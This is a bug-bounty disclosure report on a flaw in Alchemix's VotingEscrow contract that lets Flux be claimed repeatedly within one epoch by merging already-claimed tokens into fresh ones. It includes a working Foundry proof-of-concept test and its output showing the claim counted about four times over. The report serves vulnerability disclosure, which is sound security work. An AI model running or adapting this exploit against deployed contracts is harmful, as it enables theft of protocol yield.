# 31488 - \[SC - Critical] Merging tokens allows multiple Flux accruals wi...

Submitted on May 20th 2024 at 10:37:06 UTC by @Holterhus for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31488

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

A token that has claimed Flux in the current epoch can be merged with a token that has not yet claimed Flux. This allows the already claimed token to transfer its Flux and reuse its voting power through the non-voted token. An attacker can exploit this by repeatedly merging voted tokens with fresh, non-claimed tokens to perpetually claim Flux using the same initial voting power. This allows an attacker to accrue unlimited Flux instantly.

## Vulnerability Details

Every token is allowed to accrue Flux once per epoch. The amount of claimable Flux is calculated in the `claimableFlux()` function, which multiplies the current voting power of the token by `fluxPerVeALCX`.

In the `VotingEscrow` contract, the `merge()` function allows a user to combine the voting power of token `from` and token `to`, with the `from` token ultimately burned while the `to` token continues with the combined voting power. Nothing prevents someone from claiming Flux with the `from` token, transferring its voting power to a fresh `to` token, and claiming Flux again. This will double count the underlying voting power and allow claiming multiple times in an epoch.

## Impact Details

An attacker can repeat the accrual of their Flux multiple times in an epoch using the same underlying voting power. This allows for an infinite mint of Flux.

## References

See the PoC below.

## Proof of Concept

I have created the following test file and added it to the `tests/` directory:

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract UnlimitedAccrueFluxBug is BaseTest {

    constructor() {
        setupContracts(block.timestamp);
    }

    uint256 constant NUM_LOOPS = 5;

    function testUnlimitedAccrueFluxBug() public {
        vm.startPrank(admin);

        uint256[] memory tokenIds = new uint256[](NUM_LOOPS);
        for (uint256 i; i < NUM_LOOPS; ++i) {
            if (i == 0) tokenIds[i] = createVeAlcx(admin, TOKEN_100K, MAXTIME, false);
            else tokenIds[i] = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        }

        uint256 expectedClaimableFlux;
        for (uint256 i; i < NUM_LOOPS; ++i) {
            expectedClaimableFlux += veALCX.claimableFlux(tokenIds[i]);
        }

        for (uint256 i = 1; i < NUM_LOOPS; ++i) {
            uint256 prev = tokenIds[i-1];
            uint256 next = tokenIds[i];

            voter.reset(prev);
            flux.claimFlux(prev, flux.getUnclaimedFlux(prev));
            veALCX.merge(prev, next);
        }

        console.log("Expected claimable FLUX:", expectedClaimableFlux);
        console.log("Actual FLUX claimed:", flux.balanceOf(admin));

        vm.stopPrank();
    }

}
```

Running the command `forge test -vvv --match-test testUnlimitedAccrueFluxBug --rpc-url $ETH_RPC_URL` gives the following result:

```
[PASS] testUnlimitedAccrueFluxBug() (gas: 5019008)
Logs:
  Expected claimable FLUX: 98583512563800063892800
  Actual FLUX claimed: 39432419229826226642800
```

Since `39432419229826226642800 / 98583512563800063892800` is approximately `3.999`, this specific example shows that the Flux from `tokenIds[0]` can be quadruple counted by using 4 fresh token ids.
